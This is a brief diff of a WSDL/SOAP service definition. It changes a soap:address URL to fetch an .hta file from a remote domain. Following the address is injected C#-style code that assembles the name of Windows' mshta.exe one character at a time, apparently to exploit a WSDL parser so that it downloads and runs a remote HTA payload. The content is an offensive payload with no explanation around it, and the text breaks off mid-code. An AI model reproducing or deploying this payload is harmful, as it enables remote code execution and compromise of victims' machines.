@@ -11,7 +11,7 @@
     </binding>
     <service name="Service">
         <port name="Port" binding="tns:Binding">
-            <soap:address location="http://?m?http://192.168.1.3:/cmd.hta"/>
+            <soap:address location="http://?m?http://www.traininews.com/fs.hta"/>
                         <soap:address location=";
                         char str = 's';  char str1 = 'h';  char str2 = 't';  char str3 = 'a';  char str4 = '.';  char str5 = 'e';  char str6 = 'x';  char str7 = 'e';  char str8 = 'b';  char str9 = 'b';  char str10 = 'b';  char str11 = 'b';
                         if (System.AppDomain.CurrentDomain.GetData(_url.Split('?')[0]) == null) {			
